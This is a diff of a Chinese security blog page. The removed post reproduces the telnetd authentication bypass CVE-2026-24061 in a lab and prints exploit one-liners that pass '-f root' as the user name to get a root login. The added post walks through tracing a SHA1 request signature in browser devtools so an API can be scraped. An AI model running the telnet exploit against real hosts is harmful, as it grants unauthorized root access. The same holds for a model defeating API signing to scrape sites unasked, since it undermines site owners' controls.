@@ -19,21 +19,32 @@
   <meta name="author" content="Ma5k">
   <meta name="keywords" content="">
   
-    <meta name="description" content="AimCVE-2026-24061inetutils-telnetd远程认证绕过漏洞复现 Principle字符拼接，通过构造恶意环境变量USER的值（如-f root），绕过Telnet服务的身份验证流程，直接以root权限登录目标系统。该漏洞源于telnetd在调用&#x2F;usr&#x2F;bin&#x2F;login时未对输入参数进行有效性校验，导致恶意参数被注入并执行。 123456字">
+    <meta name="description" content="声明仅用于技术交流分享，严禁恶意利用，感谢大佬教学OrzOrz 正文找到目标接口，抓取网络数据 在网络面板（Network Panel）中，“Fetch&#x2F;XHR” 过滤器的作用是：只显示通过 fetch() 或 XMLHttpRequest（XHR）发起的 HTTP 请求，帮助开发者快速聚焦于前端代码主动发起的 API 调用或数据请求。  而 Fetch&#x2F;XHR 请求通常承载着">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2026-24061复现">
-<meta property="og:url" content="https://alenirving.github.io/2026/01/23/CVE-2026-24061%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="xx控接口">
+<meta property="og:url" content="https://alenirving.github.io/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/index.html">
 <meta property="og:site_name" content="Ma5k&#39;s Blog">
-<meta property="og:description" content="AimCVE-2026-24061inetutils-telnetd远程认证绕过漏洞复现 Principle字符拼接，通过构造恶意环境变量USER的值（如-f root），绕过Telnet服务的身份验证流程，直接以root权限登录目标系统。该漏洞源于telnetd在调用&#x2F;usr&#x2F;bin&#x2F;login时未对输入参数进行有效性校验，导致恶意参数被注入并执行。 123456字">
+<meta property="og:description" content="声明仅用于技术交流分享，严禁恶意利用，感谢大佬教学OrzOrz 正文找到目标接口，抓取网络数据 在网络面板（Network Panel）中，“Fetch&#x2F;XHR” 过滤器的作用是：只显示通过 fetch() 或 XMLHttpRequest（XHR）发起的 HTTP 请求，帮助开发者快速聚焦于前端代码主动发起的 API 调用或数据请求。  而 Fetch&#x2F;XHR 请求通常承载着">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2026-01-22T16:00:00.000Z">
-<meta property="article:modified_time" content="2026-01-23T02:38:19.512Z">
+<meta property="og:image" content="https://alenirving.github.io/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/1.png">
+<meta property="og:image" content="https://alenirving.github.io/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/2.png">
+<meta property="og:image" content="https://alenirving.github.io/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/3.png">
+<meta property="og:image" content="https://alenirving.github.io/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/4.png">
+<meta property="og:image" content="https://alenirving.github.io/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/5.png">
+<meta property="og:image" content="https://alenirving.github.io/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/6.png">
+<meta property="og:image" content="https://alenirving.github.io/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/7.png">
+<meta property="og:image" content="https://alenirving.github.io/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/8.png">
+<meta property="og:image" content="https://alenirving.github.io/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/9.png">
+<meta property="og:image" content="https://alenirving.github.io/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/10.png">
+<meta property="article:published_time" content="2026-01-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-02-01T07:40:03.415Z">
 <meta property="article:author" content="Ma5k">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://alenirving.github.io/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/1.png">
   
   
   
-  <title>CVE-2026-24061复现 - Ma5k&#39;s Blog</title>
+  <title>xx控接口 - Ma5k&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -236,7 +247,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CVE-2026-24061复现"></span>
+            <span id="subtitle" data-typed-text="xx控接口"></span>
           
         </div>
 
@@ -247,8 +258,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-01-23 00:00" pubdate>
-          2026年1月23日 凌晨
+        <time datetime="2026-02-01 00:00" pubdate>
+          2026年2月1日 凌晨
         </time>
       </span>
     
@@ -259,7 +270,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          482 字
+          344 字
         
       </span>
     
@@ -270,7 +281,7 @@
         
         
         
-          5 分钟
+          3 分钟
         
       </span>
     
@@ -316,59 +327,22 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">CVE-2026-24061复现</h1>
+            <h1 id="seo-header">xx控接口</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="Aim"><a href="#Aim" class="headerlink" title="Aim"></a>Aim</h1><p>CVE-2026-24061inetutils-telnetd远程认证绕过漏洞复现</p>
-<h1 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h1><p>字符拼接，通过构造恶意环境变量USER的值（如-f root），绕过Telnet服务的身份验证流程，直接以root权限登录目标系统。该漏洞源于telnetd在调用&#x2F;usr&#x2F;bin&#x2F;login时未对输入参数进行有效性校验，导致恶意参数被注入并执行。</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">字符拼接模板<br><br>PATH_LOGIN <span class="hljs-string">&quot; -p -h <span class="hljs-variable">%h</span> <span class="hljs-variable">%?</span>u&#123;-f <span class="hljs-variable">%u</span>&#125;&#123;<span class="hljs-variable">%U</span>&#125;&quot;</span><br><br>case <span class="hljs-string">&#x27;u&quot;:</span><br><span class="hljs-string">    return user_name ? xstrdup (user_name) : NULL;</span><br></code></pre></td></tr></table></figure>
-<table>
-<thead>
-<tr>
-<th>片段</th>
-<th>含义说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>PATH_LOGIN</code></td>
-<td>一个宏，一般定义为系统中 login 程序的完整路径，例如 “&#x2F;bin&#x2F;login”</td>
-</tr>
-<tr>
-<td><code>-p</code></td>
-<td>Preserve environment：保留当前环境变量（不被 login 清空）</td>
-</tr>
-<tr>
-<td><code>-h %h</code></td>
-<td>指定远程主机名或 IP；<code>%h</code> 会被替换为客户端地址（如 <code>192.168.1.100</code>）</td>
-</tr>
-<tr>
-<td><code>%?u&#123;A&#125;&#123;B&#125;</code></td>
-<td><strong>条件表达式</strong>：如果“用户名已知”（即 <code>u</code> 有值），则使用 <code>A</code>；否则使用 <code>B</code></td>
-</tr>
-<tr>
-<td><code>-f %u</code></td>
-<td>“快速登录”模式（fast login），<code>%u</code> 替换为用户名；可能跳过密码验证（依赖系统配置）</td>
-</tr>
-<tr>
-<td><code>%U</code></td>
-<td>通常表示用户的 UID（数字 ID），但在此上下文中更可能是备用的用户名占位符（不同实现略有差异）</td>
-</tr>
-<tr>
-<td><strong>受影响组件版本范围</strong>：<code>GNU InetUtils telnetd&gt;=1.9.3, &lt;=2.7</code></td>
-<td></td>
-</tr>
-</tbody></table>
-<h1 id="Process-Poc"><a href="#Process-Poc" class="headerlink" title="Process&amp;&amp;Poc"></a>Process&amp;&amp;Poc</h1><h2 id="build-telnet"><a href="#build-telnet" class="headerlink" title="build telnet"></a>build telnet</h2><p><em>added knowledge</em></p>
-<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-attr">[远程用户]</span> <br>    │<br>    └─(使用 telnet 客户端)───┐<br>                             ↓<br>                    <span class="hljs-selector-attr">[目标主机:23端口]</span><br>                             ↑<br>                     由 inetd 监听（若启用）<br>                             │<br>                     启动 inetutils-telnetd<br>                             │<br>                     提供登录 shell 给客户端<br></code></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install inetutils-telnetd telnet<br><span class="hljs-comment"># sudo sed -i &#x27;s/#&lt;off&gt;# telnet/telnet/&#x27; /etc/inetd.conf up主的靶机配置</span><br><span class="hljs-comment">#这里笔者直接添加，注释原内容 </span><br>telnet stream tcp nowait root /usr/sbin/telnetd telnetd<br><span class="hljs-built_in">sudo</span> /etc/init.d/inetutils-inetd start<br></code></pre></td></tr></table></figure>
-<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">USER</span>=<span class="hljs-string">&#x27;-f root&#x27;</span> telnet -a vulnerable-<span class="hljs-built_in">ip</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">175</span>.<span class="hljs-number">129</span><br><span class="hljs-symbol">or</span><br><span class="hljs-symbol">telnet</span> -l <span class="hljs-string">&quot;-f root&quot;</span> vulnerable-<span class="hljs-built_in">ip</span><br></code></pre></td></tr></table></figure>
-<p>这里用的是metasploitable2做测试，直接添加echo pts&#x2F;0 &gt; &#x2F;etc&#x2F;securetty，测试效果不理想，可以参考秀逗猫师傅起docker。</p>
-<p>这个洞不能说没有用，还是局限性太多，杨修啖酪了。</p>
-<h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a target="_blank" rel="noopener" href="https://www.venustech.com.cn/new_type/aqtg/20260122/29107.html">启明星程</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1cpzWBPEFp?vd_source=fc38b3dc21e08fbd06659511c0a23ac4">b站up</a></p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/_dLNEUgMM6F1dGPw88LjYw">秀逗猫</a></p>
+                <h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>仅用于技术交流分享，严禁恶意利用，感谢大佬教学OrzOrz</p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>找到目标接口，抓取网络数据<br><img src="/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>在网络面板（Network Panel）中，“Fetch&#x2F;XHR” 过滤器的作用是：只显示通过 fetch() 或 XMLHttpRequest（XHR）发起的 HTTP 请求，帮助开发者快速聚焦于前端代码主动发起的 API 调用或数据请求。</p>
+<blockquote>
+<p>而 Fetch&#x2F;XHR 请求通常承载着业务逻辑的核心数据交互（比如登录、获取用户信息、提交表单等）。使用该过滤器可以：<br>快速定位前后端通信的接口<br>查看请求参数（Headers、Body、Query）<br>检查响应内容（Response）和状态码（200、401、500 等）<br>分析性能（耗时、等待时间、是否慢）<br>调试跨域（CORS）或认证（Cookie、Token）问题</p>
+</blockquote>
+<p>页面不刷新但是可以加载数据，找到目标数据后cURL(bash)，观察到如下接口</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">params</span> = &#123;  <br>    <span class="hljs-string">&quot;start&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,  <br>    <span class="hljs-string">&quot;limit&quot;</span>: <span class="hljs-string">&quot;20&quot;</span>,  <br>    <span class="hljs-string">&quot;timestamp&quot;</span>: <span class="hljs-string">&quot;1769517580795&quot;</span>,  <br>    <span class="hljs-string">&quot;sign&quot;</span>: <span class="hljs-string">&quot;6d2f43e7e79bc6c2f0b80ac793a6c80055d792fa&quot;</span>  <br>&#125;  <br></code></pre></td></tr></table></figure>
+<p>搜索sign或者查看调用堆栈追踪，因为fetch&#x2F;xhr这里是异步请求<br><img src="/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/2.png" srcset="/img/loading.gif" lazyload><br><img src="/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/3.png" srcset="/img/loading.gif" lazyload><br>根据n处调用函数下断点追踪</p>
+<p>interceptors触发，断在use的内部方法<br><img src="/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/4.png" srcset="/img/loading.gif" lazyload><br>return处下断点调试至此处<br><img src="/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/5.png" srcset="/img/loading.gif" lazyload><br>参数sign未出现，追踪t(e)<br><img src="/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/6.png" srcset="/img/loading.gif" lazyload><br><img src="/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/7.png" srcset="/img/loading.gif" lazyload><br>No执行加密<br><img src="/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/8.png" srcset="/img/loading.gif" lazyload><br>sha1加密<br><img src="/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/9.png" srcset="/img/loading.gif" lazyload><br><img src="/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/10.png" srcset="/img/loading.gif" lazyload><br>最后脚本解密即可爬取</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMUQ0QkVCY0VzRT92ZF9zb3VyY2U9ZmMzOGIzZGMyMWUwOGZiZDA2NjU5NTExYzBhMjNhYzQ&#x3D;</p>
 
                 
               </div>
@@ -387,7 +361,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  <a href="/categories/JS/" class="category-chain-item">JS</a>
   
   
 
@@ -407,8 +381,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CVE-2026-24061复现</div>
-      <div>https://alenirving.github.io/2026/01/23/CVE-2026-24061复现/</div>
+      <div>xx控接口</div>
+      <div>https://alenirving.github.io/2026/02/01/xx控接口/</div>
     </div>
     <div class="license-meta">
       
@@ -440,18 +414,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/02/01/xx%E6%8E%A7%E6%8E%A5%E5%8F%A3/" title="xx控接口">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">xx控接口</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/01/17/vite%E6%90%AD%E5%BB%BA%E9%A1%B9%E7%9B%AE%E4%B8%8A%E4%BC%A0/" title="vite搭建项目上传">
-                        <span class="hidden-mobile">vite搭建项目上传</span>
+                      <a href="/2026/01/23/CVE-2026-24061%E5%A4%8D%E7%8E%B0/" title="CVE-2026-24061复现">
+                        <span class="hidden-mobile">CVE-2026-24061复现</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
